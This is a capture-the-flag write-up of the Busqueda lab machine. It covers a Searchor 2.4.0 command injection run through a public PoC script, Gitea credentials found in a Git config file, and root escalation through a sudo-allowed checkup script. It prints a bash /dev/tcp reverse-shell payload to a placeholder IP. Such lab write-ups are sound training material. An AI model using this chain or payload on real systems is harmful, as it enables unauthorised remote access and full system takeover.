# Busqueda Easy Linux Machine Write Up

![image](https://github.com/user-attachments/assets/725bea9b-f9af-49ed-875d-b5c702a279fe)


## Machine Description

Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a `Python` module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to `root`, we discover credentials within a `Git` config file, allowing us to log into a local `Gitea` service. Additionally, we uncover that a system checkup script can be executed with `root` privileges by a specific user. By utilizing this script, we enumerate `Docker` containers that reveal credentials for the `administrator` user&amp;amp;#039;s `Gitea` account. Further analysis of the system checkup script&amp;amp;#039;s source code in a `Git` repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with `root` privileges. 

## Vulnerability Found

1. Arbitrary CMD Injection in `Searchor` python module version 2.4.0
2. Insecure stored Git credentials on located in the server
3. System checkup script can be executed with root privilege

   
## Step to Re-produce

### Enumeration

### Network Enumeration

I used `nmap` with `-p-, -T5, -O, -oN` tags to enumerate the services that available in the network. 

<div align="center">
  <img src="https://github.com/user-attachments/assets/7c394f87-2128-467f-abaa-fa6b958092a4">
</div>

<div align="center">
  <p><span class="bolded"> Nmap Output</span></p>
</div>
</br>

From the output, I found that this network have 2 open services, ssh on port 22 and http on port 80.

### Web Enumeration

After found out that this network has http service, I looked into it. The interesting one is at the bottom of the page, which was showing what this web powered by.

<div align="center">
  <img src="https://github.com/user-attachments/assets/acbeb47d-8995-4de4-abbc-ebbd2ae335e6">
</div>

<div align="center">
  <p><span class="bolded"> Searchor Version</span></p>
</div>
</br>

As shown the above photo, I knew that this web used **Flask** and **Searchor version 2.4.0**. I was directly searching for the **Searchor** exploit and found out this version of Searchor is vulnerable to Aribitrary CMD Injection in the `eval()` function. I used this PoC: [Searchor Exploit](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection).

### Exploitation

In this stage, after finding the exploit for **Searchor 2.4.0**, I followed through the PoC and ran the exploit.sh that provided in the PoC Github. 

Command based on the PoC:

    ./exploit.sh site.com <Your-IP> <Your-Port>

<div align="center">
  <img src="https://github.com/user-attachments/assets/fb4235f6-7edc-4be9-92f7-672df2564429">
</div>

<div align="center">
  <p><span class="bolded"> Running the Script</span></p>
</div>
</br>

<div align="center">
  <img src="https://github.com/user-attachments/assets/858b39ad-1cff-4d12-adad-062cb00b3b46">
</div>

<div align="center">
  <p><span class="bolded"> Gain user-access level</span></p>
</div>
</br>

After gaining access to user-level, I found the cat.txt and read it.

### Privilege Escelation

In this stage, to perform privilege escelation, I found a `.git` folder in the `/var/www/app` directory. In `config` file, I found the url and credentials to login into `Gitea`.

<div align="center">
  <img src="https://github.com/user-attachments/assets/cae3212e-0430-49f6-bedc-1af3edb12bda">
</div>

<div align="center">
  <p><span class="bolded"> Gitea URL and credential</span></p>
</div>
</br>

I tried to looked and logged in into the gitea web but found nothing interesting there (maybe I am not detailed enough). 

I connected into ssh using user `svc` and password that was found earlier(gitea cody's password). I ran `sudo -l` to see what file and command that user `svc` may run.

<div align="center">
  <img src="https://github.com/user-attachments/assets/f1a5dbf8-fc95-4e94-ad9b-a8bc5fe1ce7a">
</div>

<div align="center">
  <p><span class="bolded"> Allowed run as root for svc</span></p>
</div>
</br>

I tried to run the command `sudo /usr/bin/python3 /opt/scripts/system-checkup.py *`, following the shown above, I found this:

<div align="center">
  <img src="https://github.com/user-attachments/assets/ce99808b-4860-494c-97f1-4aa0b8bc3623">
</div>

<div align="center">
  <p><span class="bolded"> Choices system checkup</span></p>
</div>
</br>

When I looked into `/opt/script` directory, I found out that it was a directory for a shell script that can be run.

<div align="center">
  <img src="https://github.com/user-attachments/assets/6be8d50f-a6e1-48a3-be1c-5069e746cd4f">
</div>

<div align="center">
  <p><span class="bolded"> Scripts</span></p>
</div>
</br>

It got me thinking for a while. But, I tried to create a new `full-checkup.sh` file in /home/user directory that containing bash command for reverse shell so that when I run it, the bash will be run.

Payload:

    #! /bin/bash bash -i >& /dev/tcp/YOUR-IP/YOUR-PORT 0>&1

I set up a netcat listener and ran the script using the same command like before, the difference was only I didn't use `*` because I chose the `full-checkup` to run the full-checkup script containing reverse shell.

<div align="center">
  <img src="https://github.com/user-attachments/assets/66622d61-360d-4261-981b-b979f18a52f2">
</div>

<div align="center">
  <p><span class="bolded"> Running the script</span></p>
</div>
</br>

<div align="center">
  <img src="https://github.com/user-attachments/assets/a1fb8ba5-d3fe-4c1f-9e6d-65120ab198de">
</div>

<div align="center">
  <p><span class="bolded"> Gaining root access</span></p>
</div>
</br>

<div align="center">
  <img src="https://github.com/user-attachments/assets/0c124544-0954-4066-8c38-4626b8adab5a">
</div>

<div align="center">
  <p><span class="bolded"> Root.txt</span></p>
</div>
</br>


Thank you for reading!

